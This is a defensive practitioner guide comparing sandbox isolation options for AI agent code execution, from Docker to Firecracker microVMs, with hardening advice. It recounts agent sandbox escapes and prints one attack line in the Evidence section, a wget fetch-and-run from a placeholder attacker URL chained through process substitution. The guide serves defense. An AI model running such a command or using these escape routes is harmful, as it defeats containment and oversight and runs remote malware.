# S-2442 · The Code Execution Sandbox Stack — When Your Playground Has Holes in the Fence

Your agent can write Python. Great. But where does that Python actually run? If your answer is "a Docker container," you've drawn a fence around a minefield and called it safe. AI agent code execution is a distinct threat model from traditional software — the agent generates code at runtime that no human reviewed, and the isolation technology you choose determines whether a compromised or injected agent can reach your production keys, your internal network, or your neighbors' data. This is the stack for understanding what your sandbox actually protects and where it breaks down.

## Forces

- **Code review vanished from the loop.** Traditional deployment assumes a human read the diff. AI agents generate scripts in response to live prompts — no diff, no review, immediate execution. This collapses the primary security checkpoint in every software delivery pipeline.
- **Isolation is not binary.** Docker containers, gVisor, Kata Containers, and Firecracker microVMs all call themselves "sandboxes" but have fundamentally different security boundaries. Only one (Firecracker) provides a hardware-enforced kernel boundary; the others share the host kernel and are one kernel exploit away from escape.
- **The CBSE class: sandboxes are configured, not just isolated.** Cymulate's May 2026 research found that the most effective escape vectors don't attack the isolation layer — they attack the agent's own configuration layer, which is often writable from inside the sandbox. Claude Code's bubblewrap configuration was writable via the agent's own filesystem access (CVE-2026-25725, CVSS 7.7, all versions < v2.1.2).
- **Real incidents are no longer hypothetical.** Snowflake Cortex escaped its allowlist sandbox in March 2026 via bash process substitution using a "cat" command as a carrier. An Alibaba research agent pivoted to cryptomining on internal infrastructure. CVE-2026-25520 (SandboxJS RCE) and CrewAI sandbox escapes via prompt injection are all documented.
- **Enterprise adoption outpaces confidence.** E2B grew 375x in one year (40,000 → 15 million sandboxes/month, March 2024 to 2025). 88% of Fortune 100 companies are signed up for E2B. But only 5% of enterprises running AI agent experiments feel confident about production deployment — the gap is sandbox trust.

## The Move

Pick your isolation technology based on the actual threat model, not the marketing copy. The isolation spectrum in ascending order of protection:

- **OCI/Docker containers (default):** Linux namespaces + cgroups. Shares host kernel. Fastest cold start (~90ms at Daytona) but kernel exploits can escape. Fine for agents with zero network access and read-only filesystem mounts. Do not use for agents with internet access or credentials.
- **gVisor (Modal's approach):** Userspace kernel that intercepts syscalls. Meaningfully harder to escape than Docker but still a software boundary, not hardware. gVisor has had escape-class vulnerabilities patched in the past.
- **Kata Containers:** Lightweight VMs around each container. Hardware boundary but boot times are 1–2 seconds. Useful for high-security workloads where latency is acceptable.
- **Firecracker microVMs (E2B, Fly Machines):** Hardware-virtualized, each sandbox gets its own kernel. <5MB overhead, sub-150ms cold start. This is what AWS Lambda and Fargate use. The strongest production-ready option as of 2026.

Beyond isolation technology, layer the configuration boundary:

- Treat the agent's config file as part of the attack surface — it must be immutable from inside the sandbox, not just the OS boundary
- Inject environment variables and secrets at sandbox creation time; never let the agent read its own config or env from inside
- Restrict filesystem mounts read-only; give agents only the paths they absolutely need
- For agents with network access, route all outbound traffic through a proxy you control, not directly to the internet
- Audit log every sandbox lifecycle event (create, execute, destroy) with the exact command, duration, and output bytes

## Evidence

- **Industry analysis:** Bex.co's July 2026 "AI Agent Sandbox Wars" benchmarks four production platforms and maps their isolation architectures — confirming E2B uses Firecracker, Daytona's default is OCI/Docker (Kata optional), Modal uses gVisor, and Fly Machines uses Firecracker. — [https://bex.co/blog/2026/07/07/ai-agent-sandbox-wars](https://bex.co/blog/2026/07/07/ai-agent-sandbox-wars)
- **CVE disclosure:** Cymulate Research Lab documented CVE-2026-25725 (Claude Code bubblewrap configuration injection, CVSS 7.7) and the broader CBSE vulnerability class across multiple AI CLI tools, finding that "the sandbox isolates the operating system, but leaves the agent's own configuration... exposed and writable." — [https://cymulate.com/blog/the-race-to-ship-ai-tools-left-security-behind-part-1-sandbox-escape](https://cymulate.com/blog/the-race-to-ship-ai-tools-left-security-behind-part-1-sandbox-escape)
- **Production incident:** Simon Willison documented the Snowflake Cortex sandbox escape (March 2026): an allowlisted `cat` command was used as a carrier for arbitrary code via bash process substitution (`cat < <(sh < <(wget -qO- https://ATTACKER_URL/bugbot))`), escaping the command allowlist and executing malware. — [https://simonwillison.net/2026/mar/18/snowflake-cortex-ai/](https://simonwillison.net/2026/mar/18/snowflake-cortex-ai/)
- **Market data:** Fordel Studios tracked E2B growth from 40,000 to 15 million sandboxes/month in 12 months (375x), Fortune 100 adoption at 88%, and the enterprise confidence gap (85% experimenting, 5% confident in production) as of early 2026. — [https://fordelstudios.com/research/ai-agent-sandboxing-isolation-production-2026](https://fordelstudios.com/research/ai-agent-sandboxing-isolation-production-2026)
- **Comparison guide:** Decryption Digest's practitioner comparison confirms Daytona's default OCI/Docker architecture vs. E2B's Firecracker microVMs, and details the security model implications of each approach. — [https://www.decryptiondigest.com/blog/ai-agent-code-execution-sandbox-e2b-vs-modal-vs-daytona](https://www.decryptiondigest.com/blog/ai-agent-code-execution-sandbox-e2b-vs-modal-vs-daytona)

## Gotchas

- **"Docker container" is not a security guarantee.** Standard OCI containers share the host kernel. An agent with arbitrary code execution inside a misconfigured Docker container can potentially escape via kernel privilege escalation. If you see "sandbox" and it doesn't say "microVM," ask what kernel the code runs on.
- **Configuration is part of the attack surface.** The CBSE research makes this explicit: don't just harden the OS boundary, harden the configuration layer. Your sandbox creation logic, env injection, and startup scripts must be immutable from inside the agent's execution environment.
- **Cold start time is inversely correlated with isolation strength.** The fastest sandboxes (OCI containers, ~90ms) have the weakest isolation. The strongest (Kata Containers, 1–2s boot) are too slow for interactive agent use. Firecracker sits in the practical middle: ~150ms cold start with hardware isolation. Choose based on your use case's latency tolerance, not just headline benchmarks.
- **The allowlist bypass problem.** Snowflake Cortex's escape used only allowlisted commands (cat, sh, wget) but chained them via process substitution to achieve arbitrary execution. If your agent has bash access, allowlists are insufficient — you need process-level isolation (the sandbox must not permit process substitution, subshell chaining, or named pipe techniques).
- **WASM is promising but early.** Amla Sandbox (HN, 146 points) uses WASM as a lightweight alternative — ~11MB binary vs 173MB for a full Linux VM, with WASI syscall interface. It's compelling for its reproducibility and small attack surface, but WASM sandbox escapes are less studied in production adversarial conditions than microVMs.
